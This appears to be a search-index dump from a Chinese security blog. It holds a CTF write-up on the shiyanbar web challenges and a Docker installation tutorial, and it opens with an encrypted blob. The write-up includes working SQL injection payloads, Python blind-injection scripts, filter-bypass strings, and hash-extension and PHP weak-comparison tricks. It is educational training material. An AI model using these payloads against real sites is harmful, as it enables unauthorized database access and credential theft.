QCyq7/OsNcRMoep3/+pHE3ozZvhJ3JwIiRMN6j77djyYEWU0D3Cm6v+bRnQztHcJnQy0O8/7gXuCgPyJT4CnxXenB87Ga/rC9ezEdUFHQFReFLkm0gyaTLu4PB7AI9zUsdtDrkIP2QnSQ4ZpYwRGoMPVKNqERw7aZ5QI0/1TckxBdvvHdoJ5jMWqSW32DoDHtwEofNLpKC8RleGKQkRHrrbUyUjAMisKLDin2a514QMAs9puN58bEYmXEkB8VlUC1aOYHsFqX2VMZM4h4mwDSR0cujaQzTjxQIHOfM12Z+zfokihRCPydYa5ErFlBEj8bXCB4gicvgWFnjXSRZj1Fa1IRbs7k64+VYGmWtUdMmlG46sw/+J487e0EfgqjyquLGrwESdixNhHzSBaM1zhA6ioUlLmwD7OlIUWuRcsLbw9ajNVwz611zTHXX4fQ9IfIywrC5k4OSo4B7Yrm8lN3HPQ6JvyDJEX06ZVNJ5ic7dlw4yjs675DOb1YJDanuynjUFIwyhHXUk5bUkNuWZtSkKKqsZVU7b1VhtiaJVjZGdEFKK4SC5Z7M0g2RQg9fE5N73/2VDpPfMb7Xmf/tN4BOEEKC5/Zi8KjKQbfnvi8Jf0KX6zr6HsHcF1UccSFMI7OqONL9r+2juRNynaZuG3IIoP05Yfa6XSAtjn9vhbi0u9C9DQsDwBQHUKg8woTtYcziZr1rGDdrHlXBFJa2TTZbCqhO49VkM54KjRQmCj+PBQfEgB3fqRhU+TtsMH1LwQ6QOJ0Pn2wLQt6IgEMWZsNjXh5jiUQp0mFqFbhaqCL/flAdMwM87TxNwDgBf5s20kOpjh+ppRyBhZCiZeaIPVJ5e8czBnW7F6KARM4/+KKkf4AVgd44gZY9DuDhvwlEsYjJlbjyhP4c+yJ1taHEKUbEFrwmn72u7VssweVUDui6cUGYp+w8s9sh/lOe2n8FWzJqNLCGndFkUPPkN0Y+gdosPySMDKorugyATld27UfIx9QrxBlqlbVsNynFeKmtgo5RMUMdDcGYRcdl1PNwiSFhimWAB8FnUm04ZV/iXYGdwknIV0nL6ikdTfk5AECe6QoOcORI7oze7jkh4FZUfT00r0oapPJHMzvlSmYcf4wfMhebfHbtttNHBIbZnoLL7EqvKJgKrAg2JPGaUuL9IWNB3V+eYo0KJNdfO9jDWcL4XqN+r1Vctsf5Ydl0QY2d44U66Dooe3xWY0m7pDpALDHbuRP9WVb8sw9h3ouTNAmUVEH9BFrJK7c3Ns26boDtw7LpmZLCwZbxbjSD1uF2f+hIaYin8l9dfuZ+imQOZT4q/GGNI7X+miUUPx8Yzb/HkyU2Y8eQE3AgNIgxzqvHvRJnKbPgQwvSrp/cRcv8XaUTlrcUQUwdb0ex4V/rs7Z4ovvxVcKDd5o7gmBp6e+VyTO8kvDr5vh3zM","categories":[{"name":"随笔","slug":"随笔","permalink":"http://chaosec.top/categories/随笔/"}],"tags":[{"name":"Essay","slug":"Essay","permalink":"http://chaosec.top/tags/Essay/"}]},{"title":"实验吧web","slug":"实验吧web","date":"2018-06-10T14:48:28.000Z","updated":"2019-01-30T11:51:11.305Z","comments":true,"path":"2018/06/10/实验吧web/","link":"","permalink":"http://chaosec.top/2018/06/10/实验吧web/","excerpt":"前言最近把bugku的题目做的差不多了，发现自己还是菜的要死(扎心..)，所以决定再做一做实验吧的题目","text":"前言最近把bugku的题目做的差不多了，发现自己还是菜的要死(扎心..)，所以决定再做一做实验吧的题目 后台登录打开网页后查看元素发现sql逻辑语句 1$sql = &quot;SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&quot;.md5($password,true).&quot;&apos;&quot;; 这个不知道密码，此处思路是md5()函数返回16进制字符串，然后16进制字符串会和SQL语句拼接，如果能够凑出一个password的字符串为 &#39; or &#39;a 这样的内容的话，不就可以绕过了，那么去哪找这样的字符串呢，一看题目url，看到了 ffifdyop ,直接提交一下这个东西，居然正好就是可以。 加了料的报错注入本题一开始我以为是报错注入，结果才知道是个盲注，题目过滤了很多东西，比如union,substr,=等，所以尝试正则注入，这也是我第一次写这个方面脚本，可能是网速的原因，注入非常慢，这里就只写一下其中的一个payload，注意：正则表达式需要对特殊字符添加转义才可以。 1234567891011121314151617181920212223import stringimport requestskeys = string.ascii_lowercase + r'!_&#123;&#125;@~,' + string.digitsflag = ''flag_yes = 'You are our member'url = 'http://ctf5.shiyanbar.com/web/baocuo/index.php'payload = \"' or (select group_concat(column_name) from information_schema.tables where !(table_schema &lt;&gt; database())) regexp '^&#123;&#125;' and 2&gt;'1\"data = &#123;'username':'aa','password':payload&#125;for i in range(15): for item in keys: tmp = item data['password'] = payload.format(flag + tmp) res = requests.post(url,data=data).text if flag_yes in res: flag += tmp print(flag) break print(i)print('database:',flag) 认真一点！这题看了别人的wp，确实6啊，自己的注入还是太菜鸡了 直接id=0或id=1发现页面回显不同，应该是盲注，再输入id=1aaaaaa,发现也可以回显，于是可以利用这个来测试过滤了，输入id=1or,会发现被过滤，继续用相同方法测试发现and,空格，^,union,substr,逗号,%等许多都被过滤了，但是发现引号没有被过滤，可以继续测试尝试闭合id=0&#39;%0aoorr%0a&#39;or&#39;=&#39;*，这说明or是被当做空格处理一次这样的方式过滤的，之前也试过/**/但是没有用,才使用%0a绕过空格过滤，接下来考试考虑盲注， 1234567891011121314151617181920212223242526272829303132333435363738import stringimport requestsfrom urllib import parsekeys = string.ascii_lowercase + string.digits + r'!_&#123;&#125;@~.'flag = ''flag_yes = 'You are in'url = r'http://ctf5.shiyanbar.com/web/earnest/index.php'payload = \"0'%0aoorr%0a((select%0agroup_concat(table_name%0aseparatoorr%0a'@')%0afrom%0ainfoorrmation_schema.tables%0awhere%0atable_schema=database())%0aregexp%0a\" + \"'&#123;&#125;$')\" + \"%0aoorr%0a'b'='a\"def blind_inje(payload): flag = '' data = &#123;'id':payload&#125; ok = True while ok: for item in keys: data['id'] = parse.unquote(payload.format(item + flag)) res = requests.post(url,data=data).text # print(payload.format(item + flag)) if flag_yes in res: flag = item + flag print(flag) break if item == '.': ok = False print('[+]:',flag)# blind_inje(payload)# table_name:fiag@users# payload1 = \"0'%0aoorr%0a((select%0agroup_concat(column_name%0aseparatoorr%0a'@')%0afrom%0ainfoorrmation_schema.columns%0awhere%0atable_name='fiag')%0aregexp%0a\" + \"'&#123;&#125;$')\" + \"%0aoorr%0a'b'='a\"# blind_inje(payload1)# column_name:fl.4g或者fl$4gpayload2 = \"0'%0aoorr%0a((select%0agroup_concat(fl$4g)%0afrom%0afiag)%0aregexp%0a'&#123;&#125;$')%0aoorr%0a'b'='a\"blind_inje(payload2)# flag:flag&#123;haha~you.win!&#125;注意点号只是一个通配符，所以这个点究竟是那个字符得多试几次# flag:flag&#123;haha~you win!&#125; NSCTF web200题目给出了加密代码，直接逆向跑一遍就好了 123456789101112&lt;?php $str = 'a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws';$str = base64_decode(strrev(str_rot13($str)));$flag = '';for($i=0;$i&lt;strlen($str);$i++)&#123; $_c = substr($str, $i, 1); $a = ord($_c); $b = chr($a-1); $flag = $flag.$b;&#125;echo strrev($flag);?&gt; 登录一下好吗先随便输入信息登录，页面会显示你的登录用户名和密码，需要注意的是页面返回的是处理之后的数据，所以可以据此判断哪些字符遭到了过滤，比如 uesrname=admin&#39; or 1=1,前端回显就没有了or，说明or被过滤，剩下的就不说了，本题可以使用万能密码，payload 1username=&apos;=&apos;&amp;password=&apos;=&apos; 那么在数据库中就变成了 select * from users where username=&#39;&#39;=&#39;&#39; and password=&#39;&#39;=&#39;&#39; ，所以就成了select * from users where 1 and 1 注意他逻辑运算的时候是一次从前往后运算的。 天下武功唯快不破看题目描述可知这题考察脚本编写，因为他要求你立即在限定时间内提交返回的base64解码的值，如果手工操作速度肯定来不及，所以直接上脚本 123456789101112131415161718import requestsimport base64url = 'http://ctf5.shiyanbar.com/web/10/10.php'response = requests.get(url).headers['FLAG']flag = base64.b64decode(response)flag = flag.decode('utf-8')flag = flag.split(':')flag = flag[1]data = &#123;'key':flag&#125;res = requests.post(url,data=data).textprint(res) 可以得到flag 让我进去修改cookie里的source的值为1可以看到源代码 123456789101112131415161718192021222324252627$flag = \"XXXXXXXXXXXXXXXXXXXXXXX\";$secret = \"XXXXXXXXXXXXXXX\"; // This secret is 15 characters long for security!$username = $_POST[\"username\"];$password = $_POST[\"password\"];if (!empty($_COOKIE[\"getmein\"])) &#123; if (urldecode($username) === \"admin\" &amp;&amp; urldecode($password) != \"admin\") &#123; if ($COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password))) &#123; echo \"Congratulations! You are a registered user.\\n\"; die (\"The flag is \". $flag); &#125; else &#123; die (\"Your cookies don't match up! STOP HACKING THIS SITE.\"); &#125; &#125; else &#123; die (\"You are not an admin! LEAVE.\"); &#125;&#125;setcookie(\"sample-hash\", md5($secret . urldecode(\"admin\" . \"admin\")), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[\"source\"])) &#123; setcookie(\"source\", 0, time() + (60 * 60 * 24 * 7));&#125;else &#123; if ($_COOKIE[\"source\"] != 0) &#123; echo \"\"; // This source code is outputted here &#125;&#125; 代码逻辑要求username=admin而password不等于admin，然后cookie里面的getmein的MD5值与$secret+username+password的值拼接取MD5相等即可绕过验证，这里需要用到hash长度扩展攻击，具体原理可以参看网上其他文章，这里推荐一个工具Python包hashpump，我是在linux下使用的 简单的SQL注入3题目虽然说的是报错注入，但是确保报错注入的函数给过滤完了，所以题目实际上是个盲注，直接盲注就可以了，上一波脚本 1234567891011121314151617181920212223import requestsimport stringurl = 'http://ctf5.shiyanbar.com/web/index_3.php'payload = \"?id=0' or (substr(database(),&#123;&#125;,1)='&#123;&#125;')%23\" # database:web1words = string.ascii_lowercase + string.digits + '&#123;&#125;_!~@%^&amp;*-'flag_yes = 'Hello'flag = ''payload1 = \"?id=0' or (substr((select group_concat(table_name separator '@') from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;')%23\"# table_name: flag@web1payload2 = \"?id=0' or (substr((select group_concat(flag separator '@') from information_schema.columns where table_name='flag'),&#123;&#125;,1)='&#123;&#125;')%23\"# column_name = flag@idpayload3 = \"?id=0' or (substr((select group_concat(flag separator '@') from flag),&#123;&#125;,1)='&#123;&#125;')%23\"for i in range(8,30): for item in words: res = requests.get(url + payload3.format(str(i),item)).text if flag_yes in res: flag += item print(flag) break if item == '-': print('end')# flag&#123;y0u_@r3_5o_damn_90od&#125; 大小写可能有问题 本题没有过滤其他任何东西，所以其实使用sqlmap等工具更为简单，此处贴出脚本这是为了方便大家了解其中的原理。 简单的SQL注入线简单测试一下 id=1&#39; 页面回显报错，尝试报错注入，可以得到数据库名为 web1 ，在尝试一下过滤了那些字符没回发现过滤了许多字符 from , where ,group_concat , order , union ，这里有许多字符过滤时另加了一个空格，很恶心。 最后用报错注入老是有问题，后来决定换union试一下 1?id=0&apos; uunion nion selselect ect group_congroup_concatcat(table_name) frfrom om information_schema.tables whwhere ere table_sctable_schemahema=&apos;web1 可知表名flag,web_1 , 1?id=0&apos; uunion nion selselect ect group_congroup_concatcat(colucolumn_namemn_name) frfrom om informinformatiion_schemaation_schema.columns whwhere ere table_name=&apos;flag 结果返回权限不够 SELECT command denied to user ‘web1’@’localhost’ for table ‘columns’ 又看到题目说获取flag值，猜测列名应该是flag， 最终payload 1?id=0&apos; uunion nion selselect ect flag frfrom om flag whwhere ere &apos;a&apos;=&apos;a 简单的SQL注入21?id=1&apos;%23 可以正常回显，加空格则不可以，说明过滤了空格，后面测试发现还过滤了括号。空格的绕过可以用/**/绕过，括号的话本题返回的结果数为所有结果，所以其实并不需要括号 123?id=-1&apos;/**/union/**/select/**/table_name/**/from/**/information_schema.tables%23?id=-1&apos;/**/union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=&apos;flag&apos;%23?id=-1&apos;/**/union/**/select/**/flag/**/from/**/flag%23 这个看起来有点简单很常规的一套操作 1http://ctf5.shiyanbar.com/8/index.php?id=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() 后面的省略 因缺思汀的绕过查看元素即可得到源码，这是基础，源码位置在 source.txt 。 123456789101112131415161718192021222324252627282930313233343536function AttackFilter($StrKey,$StrValue,$ArrReq)&#123; if (is_array($StrValue))&#123; $StrValue=implode($StrValue); &#125; if (preg_match(\"/\".$ArrReq.\"/is\",$StrValue)==1)&#123; print \"姘村彲杞借垷锛屼害鍙禌鑹囷紒\"; exit(); &#125;&#125;$filter = \"and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\";foreach($_POST as $key=&gt;$value)&#123; AttackFilter($key,$value,$filter);&#125;$con = mysql_connect(\"XXXXXX\",\"XXXXXX\",\"XXXXXX\");if (!$con)&#123; die('Could not connect: ' . mysql_error());&#125;$db=\"XXXXXX\";mysql_select_db($db, $con);$sql=\"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'\";$query = mysql_query($sql); if (mysql_num_rows($query) == 1) &#123; $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) &#123; print \"CTF&#123;XXXXXX&#125;\"; &#125;else&#123; print \"浜﹀彲璧涜墖锛�\"; &#125;&#125;else&#123; print \"涓€棰楄禌鑹囷紒\";&#125;mysql_close($con);?&gt; 关键代码如下： 12345678910$sql=&quot;SELECT * FROM interest WHERE uname = &apos;&#123;$_POST[&apos;uname&apos;]&#125;&apos;&quot;;$query = mysql_query($sql); if (mysql_num_rows($query) == 1) &#123; $key = mysql_fetch_array($query); if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) &#123; print &quot;CTF&#123;XXXXXX&#125;&quot;; &#125;else&#123; print &quot;浜﹀彲璧涜墖锛�&quot;; &#125;&#125; 第一道绕过要求必须返回结果切值返回一行结果，可以考虑limit，由于逗号也被过滤了，故可以使用offset来控制返回的结果个数，例如： 1select * from users where username=&apos;&apos; or 1=1 limit 1 offset 0 但是这里第二道过滤要求提交的密码和数据库中的对应的密码相同，这个就困难了，因为我们并不知道数据库中的pwd字段值，所以这个时候看了别的大佬想到了rollup，说来惭愧，这个我之前学习SQL的时候还专门看过，结果在这题却没有想到，哎，真的是菜鸡，为什么可以用rollup原理可以在我的博客中《SQL学习笔记三》中找到，原理就是使用rollup子句会多产生一个汇总行，如果我们没有指定聚合函数，那么它的值就会是NULL，rollup子句是和group by子句一起使用的，只会在group指定的列中产生汇总行，那么就可尝试构造payload了 1uname=uname=&apos; or 1=1 group by pwd with rollup limit 1 offset 2#&amp;pwd= 这里通过更改offset后面的数字值来使数据库返回有NULL的那一行即可，至于pwd值可以利用PHP弱比较，空字符与NULL相比较会返回true，所以我们pwd不传参即可是比较返回true。 注意：这题用的rollup子句我在自己的数据库上试了之后发现不行，原因在于sql_mode的设置，查看一下数据库的该值 Variable_name | Valuesql_mode | ONLY_FULL_GROUP_BY,STRICT_ALL_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER 默认会设置有 ONLY_FULL_GROUP_BY这个模式，此时group by子句中必须包含所查询的所有列，具体的信息可以查看我的之前那篇博客，这是默认开启的，而此题目该模式应该是关闭的，运行命令 1set GLOBAL sql_mode=&apos;TRICT_ALL_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER&apos; 如此即可以在自己的数据库上实现相同的效果。 天网管理系统查看元素，发现语句 1$test=$_GET[&apos;username&apos;]; $test=md5($test); if($test==&apos;0&apos;) 可知是利用md5弱比较， 故提交username为 s878926199a ,即可得到下一个页面地址，得到如下语句 123456$unserialize_str = $_POST[&apos;password&apos;]; $data_unserialize = unserialize($unserialize_str); if($data_unserialize[&apos;user&apos;] == &apos;???&apos; &amp;&amp; $data_unserialize[&apos;pass&apos;]==&apos;???&apos;) &#123; print_r($flag); &#125; 伟大的科学家php方言道：成也布尔，败也布尔。 回去吧骚年 看代码可知是简单的反序列化的应用，但是比较坑的是这儿的user和pass的值是布尔true，因为题目提示了成也布尔，败也布尔（23333） 1234$a[&apos;user&apos;] = true;$a[&apos;pass&apos;] = true;$b = serialize($a);print($b); 提交就可以了。 拐弯抹角代码审计，就是绕过的题目的过来吧就好了 1http://ctf5.shiyanbar.com/indirection\\index.php/index.php 关键点就是还是利用\\来替换/，尽管题目限制了\\，但是在此处并没有受到限制 Forms查看元素，发现一段代码 1&lt;input name=&quot;showsource&quot; value=&quot;0&quot; type=&quot;hidden&quot;&gt; 直接修改值为1即可查看源代码，然后一波简单操作就得到flag 忘记密码了先随便输入个邮箱之后页面会返回跳转链接 step2.php?email=youmail@mail.com&amp;check=??????? ,访问发现页面会自动跳转到step1.php，抓包看一下发现关键点 1234567&lt;form action=&quot;submit.php&quot; method=&quot;GET&quot;&gt; &lt;h1&gt;æ¾åå¯ç step2&lt;/h1&gt; email:&lt;input name=&quot;emailAddress&quot; type=&quot;text&quot; &lt;br /&gt; value=&quot;youmail@mail.com&quot; disable=&quot;true&quot;/&gt;&lt;/br&gt; token:&lt;input name=&quot;token&quot; type=&quot;text&quot; /&gt;&lt;/br&gt; &lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;&lt;/form&gt; 访问submit.php页面，提示不是admin，在查看抓包内容 12&lt;meta name=&quot;admin&quot; content=&quot;admin@simplexue.com&quot; /&gt;&lt;meta name=&quot;editor&quot; content=&quot;Vim&quot; /&gt; 发现是vim编辑器，那么可能是备份文件泄露，访问 .submit.php.swp得到源代码，核心过滤如下 12if(strlen($token)!=10) die('fail');if($token!='0') die('fail'); 这个用0e即可绕过，剩下的就是admin的邮箱，前面有一段内容 content=&quot;admin@simplexue.com&quot; 猜测可能就是admin邮箱，提交一下果然可以 1http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin@simplexue.com&amp;token=0e00000000 once more很简单，ereg()函数截断，只在PHP5中才有，注意要在地址栏中提交因为在题目给的输入框中提交会再次url编码 11e8%00*-* Guess next session1234567891011&lt;?phpsession_start(); if (isset ($_GET[&apos;password&apos;])) &#123; if ($_GET[&apos;password&apos;] == $_SESSION[&apos;password&apos;]) die (&apos;Flag: &apos;.$flag); else print &apos;&lt;p&gt;Wrong guess.&lt;/p&gt;&apos;;&#125;mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt; 题目最后一行给出的应该是密码的生成逻辑，显然是不可能构造出来的，那么我们可以通过修改session(删除掉对应的sessionid)使 $_SESSION[&#39;password&#39;] 为空，那么我们提交一个空的密码那么在验证时就会有 &#39;&#39;==&#39;&#39; 为true，即可验证通过 FALSE12345678910111213&lt;?phpif (isset($_GET['name']) and isset($_GET['password'])) &#123; if ($_GET['name'] == $_GET['password']) echo '&lt;p&gt;Your password can not be your name!&lt;/p&gt;'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo '&lt;p&gt;Invalid password.&lt;/p&gt;';&#125;else&#123; echo '&lt;p&gt;Login first!&lt;/p&gt;';&#125;?&gt; sha1数组绕过即可 1?name[]=2&amp;password[]=1 程序逻辑问题查看元素可以看到有个 index.txt ，访问以下得到源码，这里只给出部分 123456789101112131415161718192021if($_POST[user] &amp;&amp; $_POST[pass]) &#123; $conn = mysql_connect(\"********\", \"*****\", \"********\"); mysql_select_db(\"phpformysql\") or die(\"Could not select database\"); if ($conn-&gt;connect_error) &#123; die(\"Connection failed: \" . mysql_error($conn));&#125; $user = $_POST[user];$pass = md5($_POST[pass]);$sql = \"select pw from php where user='$user'\";$query = mysql_query($sql);if (!$query) &#123; printf(\"Error: %s\\n\", mysql_error($conn)); exit();&#125;$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[\"pw\"]; if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123; echo \"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;\";&#125; 分析题目逻辑，先是将输入的密码值md5变换一下，在数据中查询与用户名相等的用户名并提取结果，然后用返回结果对应的密码字段和刚昂MD5变换后的字段比较，如果相等则成功返回flag，我刚开始想思路放在strcasecmp()函数上，思路并不对。这题的突破口在于sql语句，我们可以尝试sql注入，尝试绕过这个user认证字段，即user字段提交 1&apos; and 0=1 union select &apos;c4ca4238a0b923820dcc509a6f75849b&apos;# 那么此时数据库返回的$row[pw]就是输入的这段md5值(1的md5值)，我们只需要在密码字段提交1即可绕过了，最终payload 1user=&apos; and 0=1 union select &apos;c4ca4238a0b923820dcc509a6f75849b&apos;#&amp;pass=1 PHP大法url二次编码绕过 1?id=%2568%2561%2563%256b%2565%2572%2544%254a 貌似有点难简单的x-forwarded-for修改即可 看起来有点难先是随便在admin字段尝试（因为admin字段有回显），当输入 admin&#39; and 1=1# 时返回“登录失败，错误的用户名和密码”，而如果输入 admin&#39; and 1=2# 时，则返回“数据库连接错误”！！，所以这儿是一处注入点 判断数据库长度 admin&#39; and length(database())=4# 可知数据库长度为4，接下来爆库名 ?admin=admin&#39; and substr(database(),1,3)=&#39;tes&#39;%23&amp;pass=12456&amp;action=login ,数据库名是 test 盲注脚本 1234567891011121314151617181920212223import requestsurl = \"http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin' and \"dic = ',1234567890()qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@'# payload = \"substr((Select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;'%23&amp;pass=12456&amp;action=login\"yes = '错误'length = 1table_name = '' # admincolumn_name = '' # username,password# payload = \"substr((Select group_concat(column_name) from information_schema.columns where table_name='admin'),&#123;&#125;,1)='&#123;&#125;'%23&amp;pass=12456&amp;action=login\"payload = \"substr((Select group_concat(username,password) from admin),&#123;&#125;,1)='&#123;&#125;'%23&amp;pass=12456&amp;action=login\"while(True): for i in dic: res = requests.get(url + payload.format(str(length),i)).text.encode('latin-1').decode('gb2312') if yes in res: # table_name += i column_name += i length += 1 print(column_name) break if i == '@': print('aaaaaaaaaaaaaaaaaaaaaa')# admin,idnuenna 猫抓老鼠脑洞题，注意题目响应头 Content-Row: MTUyODYyMjkxMQ== 直接把这个内容提交验证即可。。 头有点大打开后看到有如下要求 You don’t have permission to access / on this server.Please make sure you have installed .net framework 9.9!Make sure you are in the region of England and browsing this site with Internet Explorer 第一个本题好像实际上并没有限制，第二个可以通过修改user-agent字段，修改为 1: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 9.9; .NET CLR 3.5.30729; rv:11.0) like Geckog 第三个要求来自英国，可以通过修改accept-language字段的值 1en-gb;q=0.8","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"Docker简介与简单页面搭建","slug":"docker1","date":"2018-04-20T04:56:05.000Z","updated":"2019-01-30T11:55:43.416Z","comments":true,"path":"2018/04/20/docker1/","link":"","permalink":"http://chaosec.top/2018/04/20/docker1/","excerpt":"Docker简介最近要和同学做一个PHP项目需要用到docker，正好也对这个东东挺好奇的，顺便来学习一波，何为docker呢？docker的本质其实就是容器，类似于虚拟机，但是又比虚拟机更加小巧，容器技术是基于linux的内核特性(Namespace和Cgroups)的一项技术，所以在其上只能运行类linux系统而不能运行Windows系统，使用虚拟机部署文件时既需要应用和应用依赖的库，还需要完整的操作系统，但是容器的话则只需要应用和应用依赖的库即可，但是在docker之前容器的应用并不广泛，原因在于容器的自动化程度不高，部署复杂，而docker的出现则弥补了这些缺点，所以能够得到业界广泛的使用。","text":"Docker简介最近要和同学做一个PHP项目需要用到docker，正好也对这个东东挺好奇的，顺便来学习一波，何为docker呢？docker的本质其实就是容器，类似于虚拟机，但是又比虚拟机更加小巧，容器技术是基于linux的内核特性(Namespace和Cgroups)的一项技术，所以在其上只能运行类linux系统而不能运行Windows系统，使用虚拟机部署文件时既需要应用和应用依赖的库，还需要完整的操作系统，但是容器的话则只需要应用和应用依赖的库即可，但是在docker之前容器的应用并不广泛，原因在于容器的自动化程度不高，部署复杂，而docker的出现则弥补了这些缺点，所以能够得到业界广泛的使用。 Docker安装安装前检查 内核版本(具体支持哪些版本可以在官网查看) 1uname -a 如果内核不支持可以升级内核 检查Device Mapper(存储驱动) 1ls -l /sys/class/misc/device-mapper 查看文件是否存在 安装Docker安装Docker有两种可用的版本，一种是Ubuntu维护的版本，一种是Docker维护的版本，推荐安装Docker维护的版本，因为它的版本较新，安装步骤官方已经编写成一个脚本，可以非常简单的安装，我们只需要下载这个脚本并运行即可， Ubuntu试了好多种方法才安装好，最后还是用了官方推荐的方法，我的版本号如下 Linux ubuntu 4.10.0-37-generic #41-Ubuntu SMP Fri Oct 6 20:20:37 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 由于在公共镜像仓库拉取镜像需要https协议，需要对于组件的安装。 123apt-get install curlapt-get install ca-certificatesapt-get install software-properties-common 1apt-get install apt-transprt-https 安装不顺利，报错：Unable to locate package apt-transprt-https，需要单独下载安装包及依赖包 1234wget http://ftp.nl.debian.org/debian/pool/main/a/apt/apt-transport-https_1.4.8_amd64.debdpkg -i apt-transport-https_1.4.8_amd64.debwget http://ftp.nl.debian.org/debian/pool/main/a/apt/libapt-pkg5.0_1.4.8_amd64.debdpkg -i libapt-pkg5.0_1.4.8_amd64.deb 添加 Docker 官方的 GPG key 1curl -fssl https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - 将 Docker 的源添加到 /etc/apt/sources.list 1add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot; 更新一下镜像 1apt-get update 安装docker 1apt-get install docker-ce 开启docker守护进程 1sudo service docker start 运行第一个容器，输出‘hello world’ 1sudo docker run centos echo &apos;hello world&apos; CentOS执行安装脚本 1sudo apt-get update 1curl -fsSL https://get.docker.com/ | sh 安装完成后查看版本信息 1sudo docker version 开启docker守护进程 1sudo service docker start 运行第一个容器，输出‘hello world’ 1sudo docker run centos echo &apos;hello world&apos; 以上命令都只是在root权限下运行，如果要在非root权限下运行，则需要将当前用户添加进去docker用户组中 1sudo groupadd docker 1sudo gpasswd -a charles docker 之后重启docker服务 1sudo service docker restart 注销当前账户再重新登录即可运行docker命令啦！ 1docker version WindowsWindows安装比较简单，到网址下载之后按照要求安装即可 Docker的基本操作启动容器1docker run centos echo &apos;hello world&apos; 在输出hello world之后镜像也就关闭了，无法交互 启动交互式容器1docker run -i -t IMAGE /bin/bash -i: —interactive=true|默认是false，为容器始终打开标准输入-t: —tty,为容器分配一个伪tty终端 退出交互shell使用 exit 命令 查看容器1docker ps [-a] [-l] -a: all-l: latest 1docker inspect 容器唯一ID或名字 该命令可以查看容器的详细信息 定义容器名字 1docker run --name=container01 -i -t ubuntu /bin/bash 重新启动停止的容器1docker start -i 容器名或ID 删除容器1docker rm .. 注意： 只能删除已经停止的容器 守护式容器 能够长期运行没有交互式会话适合运行应用程序和服务 以守护形式运行容器 以下列命令打开一个容器 1dcoker run -i -t ubuntu /bin/bash 但是并不以exit命令退出而是以 ctrl P+Q退出，这样容器就会在后台运行 可以使用 docker ps -a 来查看容器状态可以发下容器确实在后台运行 使用attach命令再次进入容器 1docker attach 容器ID 使用 exit 命令即可退出容器 启动守护式容器最重要的方式 1docker run -d 镜像名 [command] 我们来启动一个守护式容器 1docker run --name dc1 -d ubuntu /bin/sh -c &quot;while true;do echo &apos;hello world&apos;; sleep 1; done&quot; 容器在后台运行，可以使用日志来查看执行情况 1docker logs -tf --tail 0 dc1 参数的具体含义可在帮助文档中查看 除了使用logs之外，还可使用进程命令 1docker top dc1 在已经运行的容器中启动新的进程 1docker exec [-d] [-i] [-t] 容器名 [command] 关闭守护式容器有两种方法 1docker stop dcname 1docker kill dcname stop命令会等待容器执行完毕后关闭容器，而kill则会直接关闭容器。 具体想要查看更多命令的相关情况可以使用man命令 123man docker-runman docker-top... 在docker容器中部署静态网站 设置容器的端口映射 1run -p|-P -P: 对容器所有的端口进行映射-p: 指定映射哪些容器的端口 开始部署 先运行一个带端口映射的容器 1docker run -i -t --name web -p 80 ubuntu /bin/bash 进入容器之后安装Nginx 12apt-get updateapt-get install -y nginx 接下来安装vim，用来编辑网页文件和配置文件 1apt-get install -y vim 新建一个工作目录 1mkdir -p /var/www/html 切换到工作目录下,编辑一个静态页面 12cd /var/www/htmlvim index.html 具体编辑过程省略，接下来编辑Nginx配置文件 查找一下Nginx文件的位置 1whereis nginx 查看文件目录 1ls /etc/nginx 1ls /etc/nginx/sites-enabled 可以看到有个default文件，修改该文件 将root的值改为刚才创建的文件目录 root: /var/www/html 这样，配置就完成了，切换回根目录,运行Nginx 12cd /nginx 可以使用ps命令查看nginx是否已经运行 1ps -ef 可以看到命令已经运行了,还可以查看到端口号，然后用Ctrl+P+Q退出 然后访问静态页面 1curl http://127.0.0.1:port 我们也可以用容器的IP地址来访问 1docker inspect web 可以看到容器ip地址和映射端口 “IPAddress”: “172.17.0.2”“HostPort”: “32768” 访问 1curl http://172.17.0.2 这就不需要指定端口号了，用默认的80端口即可 我们停止该容器 1docker stop web 然后在打开该服务 运行 ps -ef 可以看到并没有开启Nginx服务 这是退出容器 然后用exec命令开启Nginx服务 1docker exec web nginx 1docker top web 可以看到Nginx服务已经开启，但是这是不能用前面的ip地址访问，因为容器映射的地址已经改变，需要重新查看地址映射才能访问 至此，简单搭建静态页面完成。 Docker镜像操作镜像是容器构架的基石，接下里介绍一下如何查看和删除镜像 12345docker images [OPTIONS] [REPOSITORY] -a,--all=false -f,--filter //过滤条件 